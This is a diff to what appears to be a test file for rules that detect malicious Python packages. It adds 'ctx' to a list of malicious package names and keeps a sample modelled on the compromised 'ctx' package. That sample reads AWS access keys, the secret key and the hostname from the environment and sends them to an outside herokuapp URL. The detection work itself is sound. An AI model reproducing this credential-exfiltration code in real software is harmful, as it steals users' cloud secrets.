@@ -10,6 +10,7 @@
         - tenserflow
         - python-mysql
         - mybiubiubiu
+        - ctx
 """
 
 
@@ -159,36 +160,34 @@ req = urlrequest.Request(
 req.read()
 
 
-###
-# Real-world test case based on the compromised 'ctx' package
-###
+""" RULEID: CTX
+"""
 class Ctx(dict):
-    def __init__(self):
+  def __init__(self):
+    if environ.get('AWS_ACCESS_KEY_ID') is not None:
+        self.access = environ.get('AWS_ACCESS_KEY_ID')
+    else:
+        self.access = "empty"
 
-        if environ.get('AWS_ACCESS_KEY_ID') is not None:
-            self.access = environ.get('AWS_ACCESS_KEY_ID')
-        else:
-            self.access = "empty"
+    if environ.get('COMPUTERNAME') is not None:
+        self.name = environ.get('COMPUTERNAME')
+    elif uname() is not None:
+        self.name = uname().nodename
+    else:
+        self.name = "empty"
 
-        if environ.get('COMPUTERNAME') is not None:
-            self.name = environ.get('COMPUTERNAME')
-        elif uname() is not None:
-            self.name = uname().nodename
-        else:
-            self.name = "empty"
+    if environ.get('AWS_SECRET_ACCESS_KEY') is not None:
+        self.secret = environ.get('AWS_SECRET_ACCESS_KEY')
+    else:
+        self.secret = "empty"
 
-        if environ.get('AWS_SECRET_ACCESS_KEY') is not None:
-            self.secret = environ.get('AWS_SECRET_ACCESS_KEY')
-        else:
-            self.secret = "empty"
+    self.sendRequest()
 
-        self.sendRequest()
-
-    def sendRequest(self):
-        # ruleid: exfiltrate-sensitive-information
-        response = requests.get("https://anti-theft-web[.]herokuapp.com/hacked/"+self.name+"/"+self.access+"/"+self.secret)
+  def sendRequest(self):
+    # todoruleid: exfiltrate-sensitive-data
+    response = requests.get("https://anti-theft-web[.]herokuapp.com/hacked/"+self.name+"/"+self.access+"/"+self.secret)
 
 
 # Should not match as we only use a single env variable
-# todook: exfiltrate-sensitive-information
+# todook: exfiltrate-sensitive-data
 requests.get("foo", auth=(os.environ['GH_TOKEN'], 'x-oauth-basic'))
